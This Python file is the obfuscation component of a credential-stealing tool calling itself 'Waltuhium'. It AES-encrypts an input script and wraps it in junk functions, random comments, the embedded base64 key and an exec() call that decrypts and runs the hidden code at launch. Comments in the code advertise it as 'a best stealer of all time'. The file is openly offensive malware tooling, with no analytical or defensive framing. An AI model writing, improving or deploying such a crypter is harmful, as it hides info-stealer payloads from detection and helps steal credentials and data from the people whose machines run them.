import string
import argparse
import random
import os
import time
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

Waltuhium_Modules = "import ctypes, platform ,json, sys, shutil, sqlite3\nimport re, os, asyncio, aiohttp, time, base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend"
Decrypt_Func_Script = """
def DecryptString(key, tag, nonce, _input) -> str:
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(_input) + decryptor.finalize()
    return decrypted_data.decode(errors="ignore")
"""


class Obfuscate:
    def __init__(self, file_path: str, output_path: str) -> None:
        self.file_path = file_path
        self.output_path = output_path
        self.nonce = b"your_nonce_here"
        self.kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            iterations=100000,  # İterasyon sayısı ayarlanabilir
            salt=b"salt_string",  # Rastgele bir tuz
            length=32,  # Anahtar uzunluğu (256 bit)
        )
        self.key = self.kdf.derive(os.urandom(random.randint(10, 20)))
        self.tag = bytes()

    def Main(self) -> None:
        if not os.path.exists(self.file_path):
            print("the file does not exist:()")
            exit(0)
        junk_code = self.GenerateJunkCode()
        commands = self.GenerateCommandLines()
        for f in range(200):
            junk_code += self.GenerateJunkCode()
            commands += self.GenerateCommandLines()
        with open(self.file_path, "rb") as file:
            data = file.read()
        encrypted_data, tag = self.EncryptString(data)
        with open(self.output_path, "w", errors="ignore") as file:
            file.write(Waltuhium_Modules)
            file.write(commands)
            file.write(junk_code)
            file.write(f"\n{Decrypt_Func_Script}\n\n")
        with open(self.output_path, "ab") as file:
            file.write(b"key = base64.b64decode('" + base64.b64encode(self.key) + b"')")
            file.write(
                b"\ntag = base64.b64decode('" + base64.b64encode(self.tag) + b"')"
            )
            file.write(
                b"\nnonce = base64.b64decode('" + base64.b64encode(self.nonce) + b"')"
            )
            file.write(
                b"\nencrypted_data = base64.b64decode('"
                + base64.b64encode(encrypted_data)
                + b"')\n"
            )
            file.write(
                b"exec(DecryptString(key, tag, nonce, encrypted_data))\n# coded by Waltuh\n#Waltuhium is a best stealer of all time\n#thanks for using Waltuhium\n"
            )

    def EncryptString(self, _input):
        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.nonce))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(_input) + encryptor.finalize()
        tag = encryptor.tag
        self.tag = tag
        return (encrypted_data, tag)

    def DecryptString(self, _input, tag) -> str:
        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.nonce, tag))
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(_input) + decryptor.finalize()

        return decrypted_data

    def GenerateJunkCode(self) -> str:  # default 50
        data = f"""
def {self.GenerateRandomString(8)}{random.randint(99999, 9999999)}():
    if {random.randint(99999, 9999999)} == {random.randint(99999, 9999999)}:

        print({random.randint(99999, 9999999)})
        aaa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        print({random.randint(99999, 9999999)})
        bbb{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        z{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        zz{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        c{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        cc{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

    elif {random.randint(99999, 9999999)} == {random.randint(99999, 9999999)}:

        print({random.randint(99999, 9999999)})

        aaa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        print({random.randint(99999, 9999999)})

        bbb{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        x{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        xx{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}

        a{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
        """

        return data

    def GenerateCommandLines(self) -> str:
        junk_comment_line = f"""
# {self.GenerateRandomString(15)}
        """
        return junk_comment_line

    def GenerateRandomString(self, length: int) -> str:
        characters = string.ascii_letters + string.digits

        first_char = random.choice(string.ascii_letters)
        rest_of_chars = "".join(random.choices(characters, k=length - 1))

        return first_char + rest_of_chars


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Obfuscate a data using AES-GCM encryption."
    )
    parser.add_argument("file_path", type=str, help="file to obfuscate")
    parser.add_argument("output_path", type=str, help="output file")
    args = parser.parse_args()
    t = time.time()
    Obfuscator = Obfuscate(args.file_path, args.output_path)
    for f in range(15000):  # obfuscate for 3 time u can make 15000 xd
        Obfuscator.Main()
    print(f"The code obfuscated on {str(time.time() - t)} second\n")
